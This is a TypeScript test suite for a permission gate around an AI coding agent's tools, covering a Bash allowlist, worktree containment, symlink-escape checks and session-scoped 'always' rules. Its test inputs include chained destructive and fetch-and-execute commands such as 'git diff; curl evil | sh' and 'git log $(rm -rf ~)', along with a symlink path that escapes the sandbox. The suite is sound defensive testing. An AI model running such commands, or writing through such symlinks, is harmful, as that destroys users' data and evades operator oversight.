import { describe, it, expect, vi, afterAll } from "vitest";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { isAutoApprovedBash } from "../src/permissions.js";
import type { CanUseTool, PermissionUpdate } from "@anthropic-ai/claude-agent-sdk";
import {
  buildCanUseTool,
  contestedWrite,
  forceSessionDestination,
  ruleSuggestionDisplay,
} from "../src/permissions.js";
import type { DriverHooks } from "../src/agentDriver.js";

describe("isAutoApprovedBash", () => {
  it("approves exact allowlisted commands", () => {
    expect(isAutoApprovedBash("git status")).toBe(true);
    expect(isAutoApprovedBash("git log")).toBe(true);
    expect(isAutoApprovedBash("npm test")).toBe(true);
  });

  it("approves allowlisted prefixes followed by arguments", () => {
    expect(isAutoApprovedBash("npx vitest run")).toBe(true);
    expect(isAutoApprovedBash("npx tsc --noEmit")).toBe(true);
    expect(isAutoApprovedBash("git diff --stat HEAD~1")).toBe(true);
  });

  it("rejects prefix look-alikes without a word boundary", () => {
    expect(isAutoApprovedBash("git logger")).toBe(false);
    expect(isAutoApprovedBash("npm testx")).toBe(false);
  });

  it("rejects everything else", () => {
    expect(isAutoApprovedBash("rm -rf /")).toBe(false);
    expect(isAutoApprovedBash("npm install left-pad")).toBe(false);
    expect(isAutoApprovedBash("")).toBe(false);
  });

  it("rejects allowlisted prefixes chained/composed with shell metacharacters", () => {
    expect(isAutoApprovedBash("git status && rm -rf /")).toBe(false);
    expect(isAutoApprovedBash("git diff; curl evil | sh")).toBe(false);
    expect(isAutoApprovedBash("git log $(rm -rf ~)")).toBe(false);
    expect(isAutoApprovedBash("npx tsc > /etc/passwd")).toBe(false);
  });

  it("still approves plain allowlisted commands with no metacharacters", () => {
    expect(isAutoApprovedBash("git status")).toBe(true);
    expect(isAutoApprovedBash("npx vitest run")).toBe(true);
    expect(isAutoApprovedBash("git diff --stat HEAD~1")).toBe(true);
  });
});

function fakeHooks(decision: "allow" | "deny" | "hang" | "throw") {
  const calls: { toolName: string; input: unknown }[] = [];
  const errors: string[] = [];
  const hooks: DriverHooks = {
    onIntent: () => {},
    onPermissionError: (m) => errors.push(m),
    onPermissionRequest: (toolName, input) => {
      calls.push({ toolName, input });
      if (decision === "hang") return new Promise<never>(() => {});
      if (decision === "throw") return Promise.reject(new Error("boom"));
      return Promise.resolve(decision);
    },
    onPlanRequest: async () => "approve" as const,
  };
  return { hooks, calls, errors };
}

function opts(signal?: AbortSignal) {
  return {
    signal: signal ?? new AbortController().signal,
    toolUseID: "t1",
    requestId: "cr1",
  } as Parameters<CanUseTool>[2];
}

describe("buildCanUseTool", () => {
  it("auto-approves allowlisted Bash without asking the driver", async () => {
    const { hooks, calls } = fakeHooks("deny");
    const result = await buildCanUseTool(hooks)("Bash", { command: "git status" }, opts());
    expect(result).toEqual({ behavior: "allow" });
    expect(calls.length).toBe(0);
  });

  it("routes non-allowlisted Bash to the driver and maps allow", async () => {
    const { hooks, calls } = fakeHooks("allow");
    const result = await buildCanUseTool(hooks)("Bash", { command: "rm -rf build" }, opts());
    expect(result).toEqual({ behavior: "allow" });
    expect(calls).toEqual([{ toolName: "Bash", input: { command: "rm -rf build" } }]);
  });

  it("routes non-Bash tools to the driver and maps deny with a message", async () => {
    const { hooks, calls } = fakeHooks("deny");
    const result = await buildCanUseTool(hooks)("WebSearch", { query: "x" }, opts());
    expect(result?.behavior).toBe("deny");
    expect(result && "message" in result && result.message.length > 0).toBe(true);
    expect(calls[0].toolName).toBe("WebSearch");
  });

  it("denies (never null) when the hook rejects, and reports the error", async () => {
    const { hooks, errors } = fakeHooks("throw");
    const result = await buildCanUseTool(hooks)("Bash", { command: "rm -rf build" }, opts());
    expect(result?.behavior).toBe("deny");
    expect(errors.some((m) => m.includes("boom"))).toBe(true);
  });

  it("denies when the abort signal fires while the request is pending", async () => {
    const { hooks } = fakeHooks("hang");
    const controller = new AbortController();
    const pending = buildCanUseTool(hooks)("Bash", { command: "rm -rf build" }, opts(controller.signal));
    controller.abort();
    const result = await pending;
    expect(result?.behavior).toBe("deny");
  });
});

describe("buildCanUseTool sub-session attribution meta (T1)", () => {
  it("T1-attributed-request: passes the SDK toolUseID/agentID to the driver-ask hook as meta", async () => {
    let seenMeta: unknown;
    const hooks: DriverHooks = {
      onIntent: () => {},
      onPermissionRequest: (_toolName, _input, _signal, meta) => {
        seenMeta = meta;
        return Promise.resolve("allow" as const);
      },
      onPlanRequest: async () => "approve" as const,
    };
    const options = {
      signal: new AbortController().signal,
      toolUseID: "toolu_9",
      agentID: "agent_9",
      requestId: "cr1",
    } as Parameters<CanUseTool>[2];
    // A tool that reaches the final driver-ask path (not bash/write/bookkeeping).
    const result = await buildCanUseTool(hooks)("WebSearch", { query: "x" }, options);
    expect(result).toEqual({ behavior: "allow" });
    expect(seenMeta).toEqual({ toolUseId: "toolu_9", agentId: "agent_9" });
  });

  it("T1-bookkeeping-unaffected: a subagent bookkeeping tool stays auto-allowed with no driver ask, attribution or not", async () => {
    const { hooks, calls } = fakeHooks("deny");
    const options = {
      signal: new AbortController().signal,
      toolUseID: "toolu_sub",
      agentID: "agent_sub",
      requestId: "cr1",
    } as Parameters<CanUseTool>[2];
    const result = await buildCanUseTool(hooks)("TodoWrite", { todos: [] }, options);
    expect(result).toEqual({ behavior: "allow" });
    expect(calls.length).toBe(0);
  });
});

describe("buildCanUseTool worktree containment (file-writing tools)", () => {
  it("auto-approves Write with a relative file_path inside the worktree, without asking the driver", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = "/tmp/wt/ana";
    const result = await buildCanUseTool(hooks)(
      "Write",
      { file_path: "src/x.ts" },
      opts(),
    );
    expect(result).toEqual({ behavior: "allow" });
    expect(calls.length).toBe(0);
  });

  it("auto-approves Write with an absolute file_path inside the worktree, without asking the driver", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = "/tmp/wt/ana";
    const result = await buildCanUseTool(hooks)(
      "Write",
      { file_path: "/tmp/wt/ana/src/x.ts" },
      opts(),
    );
    expect(result).toEqual({ behavior: "allow" });
    expect(calls.length).toBe(0);
  });

  it("routes Write with an absolute file_path outside the worktree to the driver", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = "/tmp/wt/ana";
    const result = await buildCanUseTool(hooks)(
      "Write",
      { file_path: "/Users/someone/src/x.ts" },
      opts(),
    );
    expect(result?.behavior).toBe("deny");
    expect(calls.length).toBe(1);
    expect(calls[0].toolName).toBe("Write");
  });

  it("routes Write with a traversal path that resolves outside the worktree to the driver", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = "/tmp/wt/ana";
    const result = await buildCanUseTool(hooks)(
      "Write",
      { file_path: "../escape.ts" },
      opts(),
    );
    expect(result?.behavior).toBe("deny");
    expect(calls.length).toBe(1);
  });

  it("routes Edit to the driver when hooks.workdir is not set", async () => {
    const { hooks, calls } = fakeHooks("deny");
    // no hooks.workdir set
    const result = await buildCanUseTool(hooks)(
      "Edit",
      { file_path: "src/x.ts" },
      opts(),
    );
    expect(result?.behavior).toBe("deny");
    expect(calls.length).toBe(1);
    expect(calls[0].toolName).toBe("Edit");
  });

  it("routes Write with a missing file_path to the driver", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = "/tmp/wt/ana";
    const result = await buildCanUseTool(hooks)("Write", {}, opts());
    expect(result?.behavior).toBe("deny");
    expect(calls.length).toBe(1);
  });

  it("routes Write with a non-string file_path to the driver", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = "/tmp/wt/ana";
    const result = await buildCanUseTool(hooks)(
      "Write",
      { file_path: 42 },
      opts(),
    );
    expect(result?.behavior).toBe("deny");
    expect(calls.length).toBe(1);
  });

  it("still routes Bash normally when hooks.workdir is set (containment is scoped to file tools)", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = "/tmp/wt/ana";
    const result = await buildCanUseTool(hooks)(
      "Bash",
      { command: "git status" },
      opts(),
    );
    expect(result).toEqual({ behavior: "allow" });
    expect(calls.length).toBe(0);
  });

  it("auto-approves NotebookEdit with a notebook_path inside the worktree, without asking the driver", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = "/tmp/wt/ana";
    const result = await buildCanUseTool(hooks)(
      "NotebookEdit",
      { notebook_path: "/tmp/wt/ana/notebooks/a.ipynb" },
      opts(),
    );
    expect(result).toEqual({ behavior: "allow" });
    expect(calls.length).toBe(0);
  });

  it("routes NotebookEdit with a notebook_path outside the worktree to the driver", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = "/tmp/wt/ana";
    const result = await buildCanUseTool(hooks)(
      "NotebookEdit",
      { notebook_path: "/Users/someone/notebooks/a.ipynb" },
      opts(),
    );
    expect(result?.behavior).toBe("deny");
    expect(calls.length).toBe(1);
    expect(calls[0].toolName).toBe("NotebookEdit");
  });

  it("auto-approves TodoWrite without consulting the driver", async () => {
    const onPermissionRequest = vi.fn();
    const canUse = buildCanUseTool({
      onIntent: () => {},
      onPermissionRequest,
      onPlanRequest: async () => "approve" as const,
    });
    const result = await canUse(
      "TodoWrite",
      { todos: [{ content: "step 1", status: "pending", activeForm: "doing step 1" }] },
      { signal: new AbortController().signal } as any,
    );
    expect(result).toEqual({ behavior: "allow" });
    expect(onPermissionRequest).not.toHaveBeenCalled();
  });

  it("auto-approves TaskCreate without consulting the driver", async () => {
    const onPermissionRequest = vi.fn();
    const canUse = buildCanUseTool({
      onIntent: () => {},
      onPermissionRequest,
      onPlanRequest: async () => "approve" as const,
    });
    const result = await canUse(
      "TaskCreate",
      { subject: "write tests", description: "add coverage", activeForm: "writing tests" },
      { signal: new AbortController().signal } as any,
    );
    expect(result).toEqual({ behavior: "allow" });
    expect(onPermissionRequest).not.toHaveBeenCalled();
  });

  it("auto-approves TaskUpdate without consulting the driver", async () => {
    const onPermissionRequest = vi.fn();
    const canUse = buildCanUseTool({
      onIntent: () => {},
      onPermissionRequest,
      onPlanRequest: async () => "approve" as const,
    });
    const result = await canUse(
      "TaskUpdate",
      { taskId: "1", status: "completed" },
      { signal: new AbortController().signal } as any,
    );
    expect(result).toEqual({ behavior: "allow" });
    expect(onPermissionRequest).not.toHaveBeenCalled();
  });

  it("routes ExitPlanMode to onPlanRequest: approve allows, reject denies with a revise message", async () => {
    const onPermissionRequest = vi.fn();
    const decisions: Array<"approve" | "reject"> = ["approve", "reject"];
    const seenPlans: string[] = [];
    const canUse = buildCanUseTool({
      onIntent: () => {},
      onPermissionRequest,
      onPlanRequest: async (plan) => {
        seenPlans.push(plan);
        return decisions.shift()!;
      },
    });
    const opts = { signal: new AbortController().signal } as any;
    const first = await canUse("ExitPlanMode", { plan: "1. do the thing" }, opts);
    expect(first).toEqual({ behavior: "allow" });
    const second = await canUse("ExitPlanMode", { plan: "2. revised" }, opts);
    expect(second).toMatchObject({ behavior: "deny", message: expect.stringMatching(/revis/i) });
    expect(seenPlans).toEqual(["1. do the thing", "2. revised"]);
    expect(onPermissionRequest).not.toHaveBeenCalled();
  });
});

/** `contestedWrite` — the predicate (spec §6b). No env, no gate state, no
 *  mutation of its arguments. Nothing calls it on this commit; Task 8b supplies
 *  the first caller.
 *
 *  Every path below lives under a worktree root that does NOT exist on disk,
 *  which is deliberate and outlived its original reason. It was written to
 *  catch an implementation that stat'ed the target and threw; since audit M3
 *  the predicate DOES read the filesystem, so what these cases now pin is the
 *  other half of that contract — resolution stops at the deepest existing
 *  ancestor, so a not-yet-created target still answers instead of throwing. */
describe("contestedWrite", () => {
  const WD = "/tmp/wt/ana";

  it("returns the repo-relative path for a write tool on a contested path (relative input)", () => {
    const contested = new Set(["src/x.ts"]);
    expect(contestedWrite("Write", { file_path: "src/x.ts" }, WD, contested)).toBe("src/x.ts");
    expect(contestedWrite("Edit", { file_path: "src/x.ts" }, WD, contested)).toBe("src/x.ts");
  });

  it("returns the repo-relative path for an absolute input inside the worktree", () => {
    const contested = new Set(["poc/server/src/permissions.ts"]);
    expect(
      contestedWrite(
        "Edit",
        { file_path: "/tmp/wt/ana/poc/server/src/permissions.ts" },
        WD,
        contested,
      ),
    ).toBe("poc/server/src/permissions.ts");
  });

  it("normalizes the input before the membership test (`./` and `..` inside the worktree)", () => {
    const contested = new Set(["src/x.ts"]);
    expect(contestedWrite("Write", { file_path: "./src/x.ts" }, WD, contested)).toBe("src/x.ts");
    expect(contestedWrite("Write", { file_path: "src/sub/../x.ts" }, WD, contested)).toBe(
      "src/x.ts",
    );
  });

  it("reads notebook_path for NotebookEdit", () => {
    const contested = new Set(["notebooks/a.ipynb"]);
    expect(
      contestedWrite("NotebookEdit", { notebook_path: "notebooks/a.ipynb" }, WD, contested),
    ).toBe("notebooks/a.ipynb");
    expect(
      contestedWrite(
        "NotebookEdit",
        { notebook_path: "/tmp/wt/ana/notebooks/a.ipynb" },
        WD,
        contested,
      ),
    ).toBe("notebooks/a.ipynb");
  });

  it("returns null for a write tool on an uncontested path", () => {
    const contested = new Set(["src/x.ts"]);
    expect(contestedWrite("Write", { file_path: "src/other.ts" }, WD, contested)).toBeNull();
    expect(contestedWrite("Edit", { file_path: "/tmp/wt/ana/src/other.ts" }, WD, contested)).toBeNull();
    expect(
      contestedWrite("NotebookEdit", { notebook_path: "notebooks/b.ipynb" }, WD, contested),
    ).toBeNull();
  });

  it("never fires for a non-write tool, even naming a contested path (discriminating)", () => {
    const contested = new Set(["src/x.ts"]);
    for (const toolName of ["Bash", "Read", "Grep", "Glob", "WebFetch", "ExitPlanMode", "write", "edit", ""]) {
      expect(contestedWrite(toolName, { file_path: "src/x.ts" }, WD, contested)).toBeNull();
    }
    expect(
      contestedWrite("Bash", { command: "sed -i '' s/a/b/ src/x.ts", file_path: "src/x.ts" }, WD, contested),
    ).toBeNull();
  });

  it("returns null when the target escapes the worktree (containment reused unchanged)", () => {
    // The contested set deliberately contains the *escaping* spellings too, so
    // a match could only come from skipping containment.
    const contested = new Set([
      "src/x.ts",
      "../escape.ts",
      "escape.ts",
      "/Users/someone/src/x.ts",
      "Users/someone/src/x.ts",
    ]);
    expect(contestedWrite("Write", { file_path: "../escape.ts" }, WD, contested)).toBeNull();
    expect(contestedWrite("Write", { file_path: "src/../../escape.ts" }, WD, contested)).toBeNull();
    expect(contestedWrite("Edit", { file_path: "/Users/someone/src/x.ts" }, WD, contested)).toBeNull();
    expect(
      contestedWrite("NotebookEdit", { notebook_path: "../../a.ipynb" }, WD, contested),
    ).toBeNull();
    // Sibling directory sharing the worktree's name as a prefix is outside it.
    expect(contestedWrite("Write", { file_path: "/tmp/wt/anastasia/src/x.ts" }, WD, contested)).toBeNull();
  });

  it("returns null for the worktree root itself rather than an empty relative path", () => {
    const contested = new Set(["", "src/x.ts"]);
    expect(contestedWrite("Write", { file_path: WD }, WD, contested)).toBeNull();
    expect(contestedWrite("Write", { file_path: "." }, WD, contested)).toBeNull();
  });

  it("returns null and never throws on malformed input", () => {
    const contested = new Set(["src/x.ts"]);
    for (const input of [null, undefined, 42, "src/x.ts", true, [], {}, { file_path: 42 }, { file_path: null }, { notebook_path: {} }, { path: "src/x.ts" }]) {
      expect(() => contestedWrite("Write", input, WD, contested)).not.toThrow();
      expect(contestedWrite("Write", input, WD, contested)).toBeNull();
    }
  });

  it("returns null when there is no workdir, for any tool and any contested set (discriminating)", () => {
    const contested = new Set(["src/x.ts", "/tmp/wt/ana/src/x.ts"]);
    expect(contestedWrite("Write", { file_path: "src/x.ts" }, undefined, contested)).toBeNull();
    expect(
      contestedWrite("Edit", { file_path: "/tmp/wt/ana/src/x.ts" }, undefined, contested),
    ).toBeNull();
    expect(
      contestedWrite("NotebookEdit", { notebook_path: "notebooks/a.ipynb" }, undefined, contested),
    ).toBeNull();
    expect(contestedWrite("Bash", { command: "ls" }, undefined, contested)).toBeNull();
    expect(() => contestedWrite("Write", { file_path: "src/x.ts" }, undefined, contested)).not.toThrow();
  });

  it("returns null for every input when the contested set is empty", () => {
    const empty: ReadonlySet<string> = new Set<string>();
    expect(contestedWrite("Write", { file_path: "src/x.ts" }, WD, empty)).toBeNull();
    expect(contestedWrite("Edit", { file_path: "/tmp/wt/ana/src/x.ts" }, WD, empty)).toBeNull();
    expect(contestedWrite("NotebookEdit", { notebook_path: "notebooks/a.ipynb" }, WD, empty)).toBeNull();
  });

  it("is pure: reads no env, mutates neither input nor the contested set", () => {
    const contested = new Set(["src/x.ts"]);
    const add = vi.spyOn(contested, "add");
    const del = vi.spyOn(contested, "delete");
    const clear = vi.spyOn(contested, "clear");
    const input = Object.freeze({ file_path: "src/x.ts" });

    const readEnvKeys: string[] = [];
    const realEnv = process.env;
    process.env = new Proxy(realEnv, {
      get(target, prop, receiver) {
        readEnvKeys.push(String(prop));
        return Reflect.get(target, prop, receiver);
      },
    }) as NodeJS.ProcessEnv;
    let result: string | null;
    try {
      result = contestedWrite("Write", input, WD, contested);
    } finally {
      process.env = realEnv;
    }

    expect(result).toBe("src/x.ts");
    expect(readEnvKeys).toEqual([]);
    expect(add).not.toHaveBeenCalled();
    expect(del).not.toHaveBeenCalled();
    expect(clear).not.toHaveBeenCalled();
    expect([...contested]).toEqual(["src/x.ts"]);
    expect(input).toEqual({ file_path: "src/x.ts" });
  });
});

/** Audit finding M3 (`docs/audit-2026-07-30.md`): containment was purely
 *  lexical, so a symlink INSIDE the worktree pointing outside it turned every
 *  subsequent write under that path into a silently auto-approved write landing
 *  on the operator's filesystem. Git materializes committed symlinks on
 *  checkout, so planting one costs zero approvals.
 *
 *  Real directories on disk, unlike every other block in this file: a symlink
 *  is the thing under test and it cannot be faked lexically. */
describe("worktree containment resolves symlinks (audit M3)", () => {
  const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "mpai-containment-")));
  const workdir = path.join(root, "wt");
  const outside = path.join(root, "outside");
  fs.mkdirSync(path.join(workdir, "src"), { recursive: true });
  fs.mkdirSync(outside, { recursive: true });
  // (a) escapes the worktree, (b) stays inside it, (c) resolves to nothing.
  fs.symlinkSync(outside, path.join(workdir, "escape"));
  fs.symlinkSync(path.join(workdir, "src"), path.join(workdir, "alias"));
  fs.symlinkSync(path.join(workdir, "loop"), path.join(workdir, "loop"));

  afterAll(() => {
    fs.rmSync(root, { recursive: true, force: true });
  });

  it("routes a Write addressed through an escaping symlink to the driver", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = workdir;
    const result = await buildCanUseTool(hooks)(
      "Write",
      { file_path: "escape/pwned.ts" },
      opts(),
    );
    expect(result?.behavior).toBe("deny");
    expect(calls.length).toBe(1);
    expect(calls[0].toolName).toBe("Write");
  });

  it("routes an Edit of an EXISTING file reached through an escaping symlink to the driver", async () => {
    fs.writeFileSync(path.join(outside, "secret.ts"), "// operator's file");
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = workdir;
    const result = await buildCanUseTool(hooks)(
      "Edit",
      { file_path: path.join(workdir, "escape", "secret.ts") },
      opts(),
    );
    expect(result?.behavior).toBe("deny");
    expect(calls.length).toBe(1);
  });

  it("still auto-approves an ordinary write inside a REAL worktree", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = workdir;
    expect(
      await buildCanUseTool(hooks)("Write", { file_path: "src/new.ts" }, opts()),
    ).toEqual({ behavior: "allow" });
    expect(
      await buildCanUseTool(hooks)(
        "Write",
        { file_path: path.join(workdir, "src", "deep", "nested.ts") },
        opts(),
      ),
    ).toEqual({ behavior: "allow" });
    expect(calls.length).toBe(0);
  });

  it("still auto-approves a write through a symlink that stays inside the worktree", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = workdir;
    const result = await buildCanUseTool(hooks)(
      "Write",
      { file_path: "alias/x.ts" },
      opts(),
    );
    expect(result).toEqual({ behavior: "allow" });
    expect(calls.length).toBe(0);
  });

  it("falls through to the driver — never throws — when the path cannot be resolved", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = workdir;
    const result = await buildCanUseTool(hooks)(
      "Write",
      { file_path: "loop/x.ts" },
      opts(),
    );
    expect(result?.behavior).toBe("deny");
    expect(calls.length).toBe(1);
  });

  it("maps a through-symlink target to its REAL repo-relative path for the contested test", () => {
    // The alias and the real directory are one file to git, so they must be one
    // path to the contested set — otherwise the gate is bypassable by spelling.
    const contested = new Set(["src/x.ts"]);
    expect(contestedWrite("Write", { file_path: "alias/x.ts" }, workdir, contested)).toBe(
      "src/x.ts",
    );
    expect(contestedWrite("Write", { file_path: "src/x.ts" }, workdir, contested)).toBe(
      "src/x.ts",
    );
    // Outside the worktree is never a contested match, symlinked or not.
    expect(
      contestedWrite("Write", { file_path: "escape/x.ts" }, workdir, new Set(["x.ts"])),
    ).toBeNull();
  });
});

// §8.6 cycle 2, plan §0 gate 2: the ALWAYS contract. A driver's "always"
// decision resolves the SDK callback with every suggestion's destination
// FORCED to "session" — even when the suggestion itself names a settings file.
describe("buildCanUseTool always-allow (§8.6)", () => {
  const alwaysHooks = (): DriverHooks => ({
    onIntent: () => {},
    onPermissionRequest: () => Promise.resolve("always" as const),
    onPlanRequest: async () => "approve" as const,
  });

  it("§0-gate-2 contract: always resolves allow with EVERY destination forced to session", async () => {
    const suggestions: PermissionUpdate[] = [
      {
        type: "addRules",
        rules: [{ toolName: "Bash", ruleContent: "npm test:*" }],
        behavior: "allow",
        destination: "userSettings",
      },
      {
        type: "addRules",
        rules: [{ toolName: "WebFetch", ruleContent: "domain:example.com" }],
        behavior: "allow",
        destination: "projectSettings",
      },
    ];
    // `npm test` itself is allowlisted (auto-approved before the driver ask),
    // so the gate rides a non-allowlisted command.
    const result = await buildCanUseTool(alwaysHooks())(
      "Bash",
      { command: "npm run deploy" },
      { ...opts(), suggestions } as Parameters<CanUseTool>[2],
    );
    expect(result).toEqual({
      behavior: "allow",
      updatedPermissions: [
        { ...suggestions[0], destination: "session" },
        { ...suggestions[1], destination: "session" },
      ],
    });
    // Pin the forcing explicitly, not just through the spread: no destination
    // the SDK suggested may survive.
    const updated = result?.behavior === "allow" ? (result.updatedPermissions ?? []) : [];
    expect(updated.length).toBe(2);
    expect(updated.every((u) => u.destination === "session")).toBe(true);
  });

  it("a suggestion already saying session passes through unchanged in effect", async () => {
    const suggestions: PermissionUpdate[] = [
      {
        type: "addRules",
        rules: [{ toolName: "Bash", ruleContent: "npm run build:*" }],
        behavior: "allow",
        destination: "session",
      },
    ];
    const result = await buildCanUseTool(alwaysHooks())(
      "Bash",
      { command: "npm run build" },
      { ...opts(), suggestions } as Parameters<CanUseTool>[2],
    );
    expect(result).toEqual({ behavior: "allow", updatedPermissions: suggestions });
  });

  it("passes the SDK's enrichments and raw suggestions through to the hook as meta", async () => {
    let seenMeta: unknown;
    const suggestions: PermissionUpdate[] = [
      {
        type: "addRules",
        rules: [{ toolName: "Bash", ruleContent: "npm test:*" }],
        behavior: "allow",
        destination: "userSettings",
      },
    ];
    const hooks: DriverHooks = {
      onIntent: () => {},
      onPermissionRequest: (_toolName, _input, _signal, meta) => {
        seenMeta = meta;
        return Promise.resolve("allow" as const);
      },
      onPlanRequest: async () => "approve" as const,
    };
    const options = {
      signal: new AbortController().signal,
      toolUseID: "toolu_1",
      requestId: "cr1",
      suggestions,
      title: "Claude wants to run npm test",
      displayName: "Run tests",
      description: "Claude will run the test suite",
      decisionReason: "command not in allowlist",
      blockedPath: "/outside/worktree",
      matchedAskRule: { source: "userSettings", toolName: "Bash", ruleContent: "npm test:*" },
    } as Parameters<CanUseTool>[2];
    const result = await buildCanUseTool(hooks)("Bash", { command: "npm run deploy" }, options);
    expect(result).toEqual({ behavior: "allow" });
    expect(seenMeta).toEqual({
      toolUseId: "toolu_1",
      agentId: undefined,
      suggestions,
      title: "Claude wants to run npm test",
      displayName: "Run tests",
      description: "Claude will run the test suite",
      decisionReason: "command not in allowlist",
      blockedPath: "/outside/worktree",
      matchedAskRule: { source: "userSettings", toolName: "Bash", ruleContent: "npm test:*" },
    });
  });

  it("approve stays a plain allow even when suggestions arrive", async () => {
    const { hooks } = fakeHooks("allow");
    const suggestions: PermissionUpdate[] = [
      {
        type: "addRules",
        rules: [{ toolName: "Bash", ruleContent: "npm test:*" }],
        behavior: "allow",
        destination: "userSettings",
      },
    ];
    const result = await buildCanUseTool(hooks)(
      "Bash",
      { command: "npm test" },
      { ...opts(), suggestions } as Parameters<CanUseTool>[2],
    );
    expect(result).toEqual({ behavior: "allow" });
  });
});

describe("forceSessionDestination", () => {
  it("rewrites any variant's destination to session, keeping every other field", () => {
    expect(
      forceSessionDestination({
        type: "addRules",
        rules: [{ toolName: "Bash", ruleContent: "npm test:*" }],
        behavior: "allow",
        destination: "localSettings",
      }),
    ).toEqual({
      type: "addRules",
      rules: [{ toolName: "Bash", ruleContent: "npm test:*" }],
      behavior: "allow",
      destination: "session",
    });
    expect(
      forceSessionDestination({ type: "setMode", mode: "default", destination: "cliArg" }),
    ).toEqual({ type: "setMode", mode: "default", destination: "session" });
  });
});

describe("ruleSuggestionDisplay", () => {
  const addRules = (
    rules: { toolName: string; ruleContent?: string }[],
  ): PermissionUpdate => ({
    type: "addRules",
    rules,
    behavior: "allow",
    destination: "userSettings",
  });

  it("derives the compact display form from the first addRules rule", () => {
    expect(ruleSuggestionDisplay([addRules([{ toolName: "Bash", ruleContent: "npm test:*" }])])).toBe(
      "Bash(npm test:*)",
    );
  });

  it("displays the bare tool name when the rule carries no content", () => {
    expect(ruleSuggestionDisplay([addRules([{ toolName: "WebSearch" }])])).toBe("WebSearch");
  });

  it("skips non-addRules suggestions to find the first addRules one", () => {
    const setMode: PermissionUpdate = { type: "setMode", mode: "acceptEdits", destination: "session" };
    expect(
      ruleSuggestionDisplay([setMode, addRules([{ toolName: "Bash", ruleContent: "git push:*" }])]),
    ).toBe("Bash(git push:*)");
  });

  it("is undefined when the SDK suggests nothing a driver could always-allow", () => {
    expect(ruleSuggestionDisplay(undefined)).toBeUndefined();
    expect(ruleSuggestionDisplay([])).toBeUndefined();
    expect(
      ruleSuggestionDisplay([{ type: "setMode", mode: "acceptEdits", destination: "session" }]),
    ).toBeUndefined();
    expect(ruleSuggestionDisplay([addRules([])])).toBeUndefined();
  });
});
